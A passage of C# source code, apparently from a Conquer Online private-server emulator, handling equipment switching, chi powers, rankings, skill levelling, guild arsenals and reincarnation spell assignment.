                    if (!Database.ConquerItemInformation.BaseInformations.ContainsKey(eq.ID))
                    {
                        //Database.ConquerItemTable.backupAddItem(eq, client);
                        client.Send(new Message("You cannot switch equipment because " + ((Game.Enums.ItemPositionName)eq.Position).ToString().Replace("_", "~") + "'" + (string)((eq.Position % 20) == ConquerItem.Boots ? "" : "s") + " stats are not compatible with you (level or profession).", "SYSTEM", System.Drawing.Color.Red, Message.Talk));
                        return false;
                    }
                    var itemInfo = Database.ConquerItemInformation.BaseInformations[eq.ID];
                    if (!((EquipPassLvlReq(itemInfo, client) || EquipPassRbReq(itemInfo, client)) && EquipPassJobReq(itemInfo, client)))
                    {
                        client.Send(new Message("You cannot switch equipment because " + ((Game.Enums.ItemPositionName)eq.Position).ToString().Replace("_", "~") + "'" + (string)((eq.Position % 20) == ConquerItem.Boots ? "" : "s") + " stats are not compatible with you (level or profession).", "SYSTEM", System.Drawing.Color.Red, Message.Talk));
                        return false;
                    }
                }
            }
            client.Entity.AttackPacket = null;
            client.Entity.RemoveFlag(Update.Flags.Fly);
            client.AlternateEquipment = toAlternative;
            client.LoadItemStats();
            client.Equipment.UpdateEntityPacket();
            return true;
        }

        private static void QueryChi(Chi chi, GameState client)
        {
            Client.GameState pClient;
            if (Kernel.GamePool.TryGetValue(chi.UID, out pClient))
                client.Send(new ChiPowers(true).Query(pClient, false));
        }

        private static void ShowGenericRanking(GenericRanking ranking, GameState client)
        {
            ushort page = ranking.Page;
            Database.ChiTable.ChiData[] list = null;
            Func<Database.ChiTable.ChiData, int> select = null;

            if (ranking.RankingType == GenericRanking.DragonChi)
            {
                list = Database.ChiTable.Dragon;
                select = (chiData) => { return chiData.DragonPoints; };
            }
            else if (ranking.RankingType == GenericRanking.PhoenixChi)
            {
                list = Database.ChiTable.Phoenix;
                select = (chiData) => { return chiData.PhoenixPoints; };
            }
            else if (ranking.RankingType == GenericRanking.TigerChi)
            {
                list = Database.ChiTable.Tiger;
                select = (chiData) => { return chiData.TigerPoints; };
            }
            else if (ranking.RankingType == GenericRanking.TurtleChi)
            {
                list = Database.ChiTable.Turtle;
                select = (chiData) => { return chiData.TurtlePoints; };
            }
            if (list.Length < page * 10) return;
            uint count = (uint)Math.Min(list.Length - page * 10, 10);
            var nRanking = new GenericRanking(true, count);
            nRanking.Mode = GenericRanking.Ranking;
            nRanking.RankingType = ranking.RankingType;
            nRanking.Page = page;
            nRanking.RegisteredCount = (ushort)list.Length;
            int rank = (int)page * 10;
            for (int i = rank; i < rank + count; i++)
            {
                var current = list[i];
                nRanking.Append((uint)(i + 1), (uint)select(current), current.UID, current.Name);
            }
            client.Send(nRanking);
        }

        private static void ShowGenericRanking2(GenericRanking ranking, GameState client)
        {
            ushort page = ranking.Page;
            MTA.Game.Features.Flowers.Flowers[] list = null;
            Func<MTA.Game.Features.Flowers.Flowers, uint> select = null;

            if (ranking.RankingType == GenericRanking.RoseFairy)
            {
                list = MTA.Game.Features.Flowers.Flowers.RedRousesTop100;
                select = (flower) => { return flower.RedRoses; };
            }
            else if (ranking.RankingType == GenericRanking.LilyFairy)
            {
                list = MTA.Game.Features.Flowers.Flowers.LiliesTop100;
                select = (chiData) => { return chiData.Lilies; };
            }
            else if (ranking.RankingType == GenericRanking.OrchidFairy)
            {
                list = MTA.Game.Features.Flowers.Flowers.OrchidsTop100;
                select = (chiData) => { return chiData.Orchads; };
            }
            else if (ranking.RankingType == GenericRanking.TulipFairy)
            {
                list = MTA.Game.Features.Flowers.Flowers.TulipsTop100;
                select = (chiData) => { return chiData.Tulips; };
            }

            else if (ranking.RankingType == GenericRanking.KissFairy)
            {
                list = MTA.Game.Features.Flowers.Flowers.KissTop100;
                select = (flower) => { return flower.RedRoses; };
            }
            else if (ranking.RankingType == GenericRanking.LoveFairy)
            {
                list = MTA.Game.Features.Flowers.Flowers.LoveTop100;
                select = (chiData) => { return chiData.Lilies; };
            }
            else if (ranking.RankingType == GenericRanking.TineFairy)
            {
                list = MTA.Game.Features.Flowers.Flowers.TineTop100;
                select = (chiData) => { return chiData.Orchads; };
            }
            else if (ranking.RankingType == GenericRanking.JadeFairy)
            {
                list = MTA.Game.Features.Flowers.Flowers.JadeTop100;
                select = (chiData) => { return chiData.Tulips; };
            }

            if (list.Length < page * 10) return;
            uint count = (uint)Math.Min(list.Length - page * 10, 10);
            var nRanking = new GenericRanking(true, count);
            nRanking.Mode = GenericRanking.Ranking;
            nRanking.RankingType = ranking.RankingType;
            nRanking.Page = page;
            nRanking.RegisteredCount = (ushort)list.Length;
            int rank = (int)page * 10;
            for (int i = rank; i < rank + count; i++)
            {
                var current = list[i];
                nRanking.Append((uint)(i + 1), (uint)select(current), current.UID, current.Name);
            }
            client.Send(nRanking);
        }

        private static void UnlockChi(Chi chi, GameState client)
        {
            if (chi.Mode == Game.Enums.ChiPowerType.Dragon)
                if (client.Entity.Level < 110)
                    return;
            if (chi.Mode == Game.Enums.ChiPowerType.Phoenix)
                if (client.Entity.Level < 110 || client.Entity.Reborn < 1 || client.ChiPowers.Count <= 0)
                    return;
                else if (client.ChiPowers[0].Points < 300)
                    return;
            if (chi.Mode == Game.Enums.ChiPowerType.Tiger)
                if (client.Entity.Level < 110 || client.Entity.Reborn < 2 || client.ChiPowers.Count <= 1)
                    return;
                else if (client.ChiPowers[1].Points < 300)
                    return;
            if (chi.Mode == Game.Enums.ChiPowerType.Turtle)
                if (client.Entity.Level < 110 || client.Entity.Reborn != 2 || client.ChiPowers.Count <= 2)
                    return;
                else if (client.ChiPowers[2].Points < 300)
                    return;

            if (client.ChiPoints >= 300)
            {
                foreach (var power in client.ChiPowers)
                    if (power.Power == chi.Mode)
                        return;
                client.ChiPoints -= 300;
                client.ChiPowers.Add(new Game.ConquerStructures.ChiPowerStructure(chi.Mode));
                client.Send(new ChiPowers(true).Query(client));
                Database.ChiTable.Save(client);
            }
        }

        private static Game.Enums.ChiAttribute RandomChi()
        {
            return (Game.Enums.ChiAttribute)Kernel.Random.Next(1, 14);
        }

        private static ushort ChiValue(Game.Enums.ChiAttribute attribute)
        {
            int max = Game.Enums.ChiMaxValues(attribute),
                min = Game.Enums.ChiMinValues(attribute);
            //float baseDiff = max - min;
            //baseDiff /= 10f;
            //if (Kernel.Rate(4, 100))
            //    return (ushort)Kernel.Random.Next((int)(max - baseDiff), max);
            //else if (Kernel.Rate(10, 100))
            //    return (ushort)Kernel.Random.Next((int)(max - 2 * baseDiff), (int)(max - baseDiff));
            //else if (Kernel.Rate(40, 100))
            //    return (ushort)Kernel.Random.Next((int)(max - 3 * baseDiff), (int)(max - 2 * baseDiff));
            // else 
            return (ushort)Kernel.Random.Next(min, max - Kernel.Random.Next(10, 20));
        }
        private static ushort ChiValue2(Game.Enums.ChiAttribute attribute, GameState client)
        {
            return ChiValue(attribute);
            //int max = Game.Enums.ChiMaxValues(attribute),
            //    min = Game.Enums.ChiMinValues(attribute);
            //float baseDiff = max - min;
            //baseDiff /= 10f;
            //if (Kernel.Rate(client.Entity.VIPLevel, 100))
            //    return (ushort)max;
            //return (ushort)Kernel.Random.Next((int)((max + client.Entity.VIPLevel) - baseDiff), max + 1);
        }
        private static bool CanKeepChiPower(Game.ConquerStructures.ChiPowerStructure strct, int attribute, GameState client)
        {
#if NOTMULTIPLECHIPOWERS
            var attr = strct.Attributes;
            var att = attr[attribute];
            for (int i = 0; i < attr.Length; i++)
                if (i != attribute)
                    if (attr[i].Type == att.Type)
                        return false;
#endif
            return true;
        }
        private static void StudyChi(Chi chi, GameState client)
        {
            if (client.ChiPowers.Count >= (int)chi.Mode)
            {
                var powers = client.ChiPowers[(int)chi.Mode - 1];
                var attributes = powers.Attributes;
                uint cost = 50;
                if ((chi.dwParam & 0x1) == 0x1) cost += 50;
                if ((chi.dwParam & 0x2) == 0x2) cost += 50;
                if ((chi.dwParam & 0x4) == 0x4) cost += 50;
                if ((chi.dwParam & 0x8) == 0x8) cost += 50;
                if (client.ChiPoints >= cost)
                {
                    if ((chi.dwParam & 0x1) != 0x1)
                    {
                        do { attributes[0].Type = RandomChi(); }
                        while (!CanKeepChiPower(powers, 0, client));
                        attributes[0].Value = ChiValue(attributes[0].Type);
                        if (client.Entity.VIPLevel > 0)
                            attributes[0].Value = ChiValue2(attributes[0].Type, client);
                    }
                    if ((chi.dwParam & 0x2) != 0x2)
                    {
                        do { attributes[1].Type = RandomChi(); }
                        while (!CanKeepChiPower(powers, 1, client));
                        attributes[1].Value = ChiValue(attributes[1].Type);
                        if (client.Entity.VIPLevel > 0)
                            attributes[1].Value = ChiValue2(attributes[1].Type, client);
                    }
                    if ((chi.dwParam & 0x4) != 0x4)
                    {
                        do { attributes[2].Type = RandomChi(); }
                        while (!CanKeepChiPower(powers, 2, client));
                        powers.Attributes[2].Value = ChiValue(attributes[2].Type);
                        if (client.Entity.VIPLevel > 0)
                            attributes[2].Value = ChiValue2(attributes[2].Type, client);
                    }
                    if ((chi.dwParam & 0x8) != 0x8)
                    {

                        do { attributes[3].Type = RandomChi(); }
                        while (!CanKeepChiPower(powers, 3, client));
                        powers.Attributes[3].Value = ChiValue(attributes[3].Type);
                        if (client.Entity.VIPLevel > 0)
                            attributes[3].Value = ChiValue2(attributes[3].Type, client);
                    }
                    powers.CalculatePoints();
                    Database.ChiTable.Sort(chi.Mode);
                    powers.Power = chi.Mode;
                    client.Send(new ChiPowers(true).Query(client));
                    #region update ranking
                    Database.ChiTable.ChiData[] array = null;
                    switch (chi.Mode)
                    {
                        case Game.Enums.ChiPowerType.Dragon:
                            array = Database.ChiTable.Dragon;
                            break;

                        case Game.Enums.ChiPowerType.Phoenix:
                            array = Database.ChiTable.Phoenix;
                            break;

                        case Game.Enums.ChiPowerType.Tiger:
                            array = Database.ChiTable.Tiger;
                            break;

                        case Game.Enums.ChiPowerType.Turtle:
                            array = Database.ChiTable.Turtle;
                            break;
                    }
                    foreach (var chiData in array)
                    {
                        if (Kernel.GamePool.ContainsKey(chiData.UID))
                        {
                            var pClient = Kernel.GamePool[chiData.UID];
                            if (pClient == null) continue;
                            if (pClient.ChiData == null) continue;
                            SendRankingQuery(new GenericRanking(true) { Mode = GenericRanking.QueryCount }, pClient, GenericRanking.Chi + (uint)chi.Mode, pClient.ChiData.SelectRank(chi.Mode), pClient.ChiData.SelectPoints(chi.Mode));
                            if (pClient.Entity.UID == client.Entity.UID || pClient.ChiData.SelectRank(chi.Mode) < 50)
                                pClient.LoadItemStats();
                        }
                    }
                    #endregion
                    client.ChiPoints -= cost;
                    Database.ChiTable.Save(client);
                }
                else
                {
                    BuyStrengthChi(chi, client);
                }
            }
        }

        private static void BuyStrengthChi(Chi chi, GameState client)
        {
            if (client.Trade.InTrade)
                return;
            uint cost = 4000 - client.ChiPoints;
            cost /= 4;
            cost *= 5;//1000 (current cost) * 100 = 100000 cps (million) les??  100k now
            if (client.Entity.ConquerPoints >= cost)//that's it
            {
                client.Entity.ConquerPoints -= cost;
                client.ChiPoints = 4000;
                client.Send(new ChiPowers(true).Query(client));
            }
        }
        static void LevelUpSpell(Data generalData, Client.GameState client)
        {
            if (client.Trade.InTrade)
                return;
            ushort spellID = (ushort)generalData.dwParam;
            Interfaces.ISkill spell = null;
            if (client.Spells.TryGetValue(spellID, out spell))
            {
                var spellInfo = Database.SpellTable.GetSpell(spellID, client);
                if (spellInfo != null)
                {
                    if (spellInfo.CPCost != 0)
                    {
                        uint cpCost = spellInfo.CPCost;
                        int max = Math.Max((int)spell.Experience, 1);
                        int percentage = 100 - (int)(max / Math.Max((spellInfo.NeedExperience / 100), 1));
                        cpCost = (uint)(cpCost * percentage / 100);
                        if (client.Entity.ConquerPoints >= cpCost)
                        {
                            client.Entity.ConquerPoints -= cpCost;
                            spell.Level++;
                            if (spell.Level == spell.PreviousLevel / 2)
                                spell.Level = spell.PreviousLevel;
                            spell.Experience = 0;
                            spell.Send(client);
                        }
                    }
                    else
                    {
                        uint cpCost = 5000;
                        int max = Math.Max((int)spell.Experience, 1);
                        int percentage = 100 - (int)(max / Math.Max((spellInfo.NeedExperience / 100), 1));
                        cpCost = (uint)(cpCost * percentage / 100);
                        if (client.Entity.ConquerPoints >= cpCost)
                        {
                            client.Entity.ConquerPoints -= cpCost;
                            spell.Level++;
                            if (spell.Level == spell.PreviousLevel / 2)
                                spell.Level = spell.PreviousLevel;
                            spell.Experience = 0;
                            spell.Send(client);
                        }
                    }
                }
            }
        }
        static void LevelUpProficiency(Data generalData, Client.GameState client)
        {
            if (client.Trade.InTrade)
                return;
            ushort proficiencyID = (ushort)generalData.dwParam;
            Interfaces.IProf proficiency = null;
            if (client.Proficiencies.TryGetValue(proficiencyID, out proficiency))
            {
                if (proficiency.Level != 20)
                {
                    uint cpCost = 0;
                    #region Costs
                    switch (proficiency.Level)
                    {
                        case 1: cpCost = 28; break;
                        case 2: cpCost = 28; break;
                        case 3: cpCost = 28; break;
                        case 4: cpCost = 28; break;
                        case 5: cpCost = 28; break;
                        case 6: cpCost = 55; break;
                        case 7: cpCost = 81; break;
                        case 8: cpCost = 135; break;
                        case 9: cpCost = 162; break;
                        case 10: cpCost = 270; break;
                        case 11: cpCost = 324; break;
                        case 12: cpCost = 324; break;
                        case 13: cpCost = 324; break;
                        case 14: cpCost = 324; break;
                        case 15: cpCost = 375; break;
                        case 16: cpCost = 548; break;
                        case 17: cpCost = 799; break;
                        case 18: cpCost = 1154; break;
                        case 19: cpCost = 1420; break;
                    }
                    #endregion
                    uint needExperience = Database.DataHolder.ProficiencyLevelExperience(proficiency.Level);
                    int max = Math.Max((int)proficiency.Experience, 1);
                    int percentage = 100 - (int)(max / (needExperience / 100));
                    cpCost = (uint)(cpCost * percentage / 100);
                    if (client.Entity.ConquerPoints >= cpCost)
                    {
                        client.Entity.ConquerPoints -= cpCost;
                        proficiency.Level++;
                        if (proficiency.Level == proficiency.PreviousLevel / 2)
                        {
                            proficiency.Level = proficiency.PreviousLevel;
                            Database.DataHolder.ProficiencyLevelExperience((byte)(proficiency.Level + 1));
                        }
                        proficiency.Experience = 0;
                        proficiency.Send(client);
                    }
                }
            }
        }

        #region Guild Arsenal
        public static int ArsenalPosition(uint ID)
        {
            ushort pos = ItemPosition(ID);
            switch (pos)
            {
                case ConquerItem.Head:
                    return 0;
                case ConquerItem.Armor:
                    return 1;
                case ConquerItem.LeftWeapon:
                case ConquerItem.RightWeapon:
                    return 2;
                case ConquerItem.Ring:
                    return 3;
                case ConquerItem.Boots:
                    return 4;
                case ConquerItem.Necklace:
                    return 5;
                case ConquerItem.Fan:
                    return 6;
                case ConquerItem.Tower:
                    return 7;
                default:
                    return -1;
            }
        }
        static void ViewArsenalPage(ArsenalView view, Client.GameState client)
        {
            if (client.Entity.GuildID == 0 || client.Guild == null) return;
            if (client.Guild.Arsenals.Length < view.ArsenalType) return;
            var Arsenal = client.Guild.Arsenals[view.ArsenalType];
            if (Arsenal.Unlocked)
            {
                uint beginAt = view.BeginAt - 1;
                uint length = (uint)Arsenal.OrderedList.Count;
                length -= beginAt;
                length = Math.Min(length, 8);
                view = new ArsenalView(true, length);
                view.BeginAt = beginAt + 1;
                for (int i = (int)beginAt; i < beginAt + length; i++)
                    view.AppendItem(Arsenal.OrderedList[i]);
                view.EndAt = length + view.BeginAt - 1;
                view.ArsenalType = (uint)(Arsenal.Position - 1);
                view.Count = length;
                view.Donation = Arsenal.Donation;
                view.Enchantment = Arsenal.Enhancement;
                view.EnchantmentExpirationDate = Arsenal.EnhancementExpirationDate();
                view.SharedBattlepower = Arsenal.SharedBattlePower;
                view.TotalInscribed = Arsenal.OrderedList.Count;
                client.Send(view);
            }
        }
        static void InscribeArsenalItem(ArsenalCommand command, Client.GameState client)
        {
            ConquerItem item = null;
            if (client.Inventory.TryGetItem(command.dwParam2, out item))
            {
                int arsenalRealPosition = ArsenalPosition(item.ID);
                if ((item.ID % 10) >= 8 && arsenalRealPosition == command.dwParam && !item.Inscribed)
                {
                    if (client.Entity.GuildID != 0 && client.Guild != null && client.Guild.Arsenals[command.dwParam].Unlocked)
                    {
                        item.Inscribed = true;
                        item.Mode = Game.Enums.ItemMode.Update;
                        item.Send(client);
                        var Arsenal = client.Guild.Arsenals[command.dwParam];
                        Arsenal.AddItem(item, client);
                        client.Guild.SaveArsenal();
                    }
                }
            }
        }
        static void UninscribeArsenalItem(ArsenalCommand command, Client.GameState client)
        {
            if (client.Entity.GuildID != 0 && client.Guild != null)
            {
                var Arsenal = client.Guild.Arsenals[command.dwParam];
                if (Arsenal.Unlocked)
                {
                    if (Arsenal.ItemDictionary.ContainsKey(command.dwParam2))
                    {
                        var item = Arsenal.ItemDictionary[command.dwParam2];
                        if (item.OwnerUID == client.Entity.UID)
                        {
                            ConquerItem Item = null;
                            #region Find the item
                            if (!client.Inventory.TryGetItem(item.UID, out Item))
                            {
                                bool found = false;
                                foreach (var eqItem in client.Equipment.Objects)
                                    if (eqItem != null)
                                        if (eqItem.UID == item.UID)
                                        { Item = eqItem; found = true; break; }
                                if (!found)
                                {
                                    foreach (var wh in client.Warehouses.Values)
                                        foreach (var eqItem in wh.Objects)
                                            if (eqItem != null)
                                                if (eqItem.UID == item.UID)
                                                { Item = eqItem; break; }
                                }
                            }
                            #endregion
                            if (Item != null)
                            {
                                Item.Inscribed = false;
                                if (Item.Warehouse == 0)
                                {
                                    Item.Mode = Game.Enums.ItemMode.Update;
                                    Item.Send(client);
                                }
                                Arsenal.RemoveItem(item, client);
                                client.Guild.ArsenalBPChanged = true;
                                client.Guild.GetMaxSharedBattlepower();
                                client.Guild.SaveArsenal();
                            }
                        }
                    }
                }
            }
        }
        static void UnlockArsenal(ArsenalCommand command, Client.GameState client)
        {
            if (client.Entity.GuildID == 0) return;
            var Guild = client.Guild;
            if (Guild == null) return;
            if (Guild.Arsenals[command.dwParam].Unlocked)
            {
                client.Send(new Message("This arsenal was already unlocked!", System.Drawing.Color.Red, Message.Talk));
                return;
            }
            uint cost = Guild.GetCurrentArsenalCost();
            if (Guild.SilverFund >= cost)
            {
                Guild.SilverFund -= cost;
                Guild.Arsenals[command.dwParam].Unlocked = true;
                Guild.SendGuild(client);

                Guild.ArsenalBPChanged = true;
                Guild.GetMaxSharedBattlepower();
                client.Guild.SaveArsenal();
            }
            else
            {
                client.Send(new Message("Your guild doesn't have enough funds!", System.Drawing.Color.Red, Message.Talk));
            }
        }
        static void ViewGuildArsenal(Client.GameState client)
        {
            if (client.Entity.GuildID == 0) return;
            if (client.Guild == null) return;
            ArsenalTab view = new ArsenalTab(true);
            view.SharedBattlepower = (uint)client.Guild.GetMaxSharedBattlepower();
            view.ArsenalCount = 8;
            foreach (var arsenal in client.Guild.Arsenals)
                view.AppendArsenal(arsenal);
            view.HeroDonation = client.GetArsenalDonation();
            view.HeroSharedBattlepower = client.Entity.GuildBattlePower;
            client.Send(view);
        }
        public static void UninscribeItem(ConquerItem item, Client.GameState client)
        {
            if (client.Entity.GuildID == 0 || client.Guild == null) return;
            int arsenalPosition = ArsenalPosition(item.ID);
            client.Guild.Arsenals[arsenalPosition].RemoveItem(item, client);
            item.Inscribed = false;
            item.Mode = Game.Enums.ItemMode.Update;
            item.Send(client);
            //Save is done other else.
        }
        public static void UninscribeAllItems(Client.GameState client)
        {
            foreach (var item in client.Inventory.Objects)
                if (item.Inscribed)
                    UninscribeItem(item, client);
            foreach (var item in client.Equipment.Objects)
                if (item != null)
                    if (item.Inscribed)
                        UninscribeItem(item, client);
            foreach (var wh in client.Warehouses.Values)
                foreach (var item in wh.Objects)
                    if (item.Inscribed)
                        UninscribeItem(item, client);

            client.Guild.ArsenalBPChanged = true;
            client.Guild.GetMaxSharedBattlepower();
            client.Guild.SaveArsenal();
        }
        public static void EnchantArsenal(ArsenalCommand command, Client.GameState client)
        {
            if (client.Entity.GuildID == 0 || client.Guild == null) return;
            var guild = client.Guild;
            var arsenal = guild.Arsenals[command.dwParam];
            if (!arsenal.Unlocked) return;
            if (arsenal.SharedBattlePower == 3) return;
            uint cost = 20000000 + command.dwParam3 * 40000000;
            if (guild.SilverFund >= cost)
            {
                guild.SilverFund -= cost;
                arsenal.Enhancement = command.dwParam3;
                arsenal.EnhancementExpDate = DateTime.Now.AddDays(30);

                guild.ArsenalBPChanged = true;
                guild.GetMaxSharedBattlepower();
                client.Guild.SaveArsenal();
            }
        }
        #endregion

        public static void ReincarnationHash(Client.GameState client)
        {
            if (Kernel.ReincarnatedCharacters.ContainsKey(client.Entity.UID))
            {
                if (client.Entity.Level >= 110 && client.Entity.Reborn == 2)
                {
                    ushort stats = 0;
                    uint lev1 = client.Entity.Level;
                    Game.Features.Reincarnation.ReincarnateInfo info = Kernel.ReincarnatedCharacters[client.Entity.UID];
                    client.Entity.Level = info.Level;
                    client.Entity.Experience = info.Experience;
                    Kernel.ReincarnatedCharacters.Remove(info.UID);
                    Database.ReincarnationTable.RemoveReincarnated(client.Entity);
                    stats = (ushort)(((client.Entity.Level - lev1) * 3) - 3);
                    client.Entity.Atributes += stats;
                }
            }
        }
        #region Reincarnation

        public class Reincarnation
        {
            private Client.GameState _client;

            public Reincarnation(Client.GameState client, byte new_class)
            {
                if (client.Entity.Level < 110)
                    return;
                if (Kernel.ReincarnatedCharacters.ContainsKey(client.Entity.UID))
                    return;
                _client = client;
                Database.ReincarnationTable.NewReincarnated(client.Entity);
                Game.Features.Reincarnation.ReincarnateInfo info = new Game.Features.Reincarnation.ReincarnateInfo();
                info.UID = client.Entity.UID;
                info.Level = client.Entity.Level;
                info.Experience = client.Entity.Experience;
                Kernel.ReincarnatedCharacters.Add(info.UID, info);
                client.Entity.FirstRebornClass = client.Entity.SecondRebornClass;
                client.Entity.SecondRebornClass = client.Entity.Class;
                client.Entity.Class = new_class;
                client.Entity.SecondRebornLevel = client.Entity.Level;
                //client.Entity.ReincarnationLev = client.Entity.Level;//kikoz
                client.Entity.Level = 15;
                client.Entity.Experience = 0;
                client.Entity.Strength = 0;
                client.Entity.Vitality = 0;
                client.Entity.Agility = 0;
                client.Entity.Spirit = 0;
                client.Entity.Atributes =
                    (ushort)
                        (client.ExtraAtributePoints(client.Entity.FirstRebornClass, client.Entity.FirstRebornLevel) +
                         client.ExtraAtributePoints(client.Entity.SecondRebornClass, client.Entity.SecondRebornLevel) +
                         62);
                Database.DataHolder.GetStats(client.Entity.Class, client.Entity.Level, client);
                client.CalculateStatBonus();
                client.CalculateHPBonus();
                client.GemAlgorithm();

                #region RemoveAllSpells

                Interfaces.ISkill[] spells = client.Spells.Values.ToArray();
                foreach (Interfaces.ISkill spell in spells)
                {
                    if (!Constants.AvaibleSpells.Contains(spell.ID))
                    {
                        client.RemoveSpell(spell);
                        Database.SkillTable.DeleteSpell(client, spell.ID);
                    }
                    //spell.Send(client);
                }
                //Skills.Clear();
                //   client.Spells.Clear();
                //   Database.SkillTable.removeAllSkills(client); //Samak
                //Profs.Clear();
                client.Proficiencies.Clear();
                Database.SkillTable.removeAllProfs(client); //Samak  

                #region Archer2
                #region Arch-Arch
                if (client.Entity.FirstRebornClass == 45 && client.Entity.SecondRebornClass == 45)
                {

                    if (client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10313 });//Star Franko
                        client.AddSpell(new Spell(true) { ID = 5000 });//Freezing Frankos
                    }
                    else
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5000 });//Freezing Frankos
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                    }
                }
                #endregion
                #region Arch-Fire
                else if (client.Entity.FirstRebornClass == 45 && client.Entity.SecondRebornClass == 145)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                        client.AddSpell(new Spell(true) { ID = 1001 });//Fire
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                    }
                    else if (client.Entity.Class == 51 || client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                        client.AddSpell(new Spell(true) { ID = 1001 });//Fire
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 10010 });//Poison
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 1120 });//FireCircle
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 3080 });//Dodge
                    }
                }
                #endregion
                #region Arch-Tro
                if (client.Entity.FirstRebornClass == 45 && client.Entity.SecondRebornClass == 15)
                {
                    if (client.Entity.Class == 41 || client.Entity.Class == 132 || client.Entity.Class == 142 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                    }
                    else if (client.Entity.Class == 11)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 3050 });//CruelShade
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 5100 });//Iron Shirt
                    }

                }

                #endregion
                #region Arch-War
                if (client.Entity.FirstRebornClass == 45 && client.Entity.SecondRebornClass == 25)
                {
                    if (client.Entity.Class == 142 || client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 1015 });//Accuracy
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                        client.AddSpell(new Spell(true) { ID = 1320 });//FlyingMoon
                    }
                    else if (client.Entity.Class == 51)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                        client.AddSpell(new Spell(true) { ID = 1025 });//SuperMan
                    }
                }


                #endregion
                #region Arch-Water
                if (client.Entity.FirstRebornClass == 45 && client.Entity.SecondRebornClass == 135)
                {
                    if (client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1090 });//MagicShield
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 1280 });//WaterElf
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1085 });//StarOfAccuracy
                        client.AddSpell(new Spell(true) { ID = 1090 });//MagicShield
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
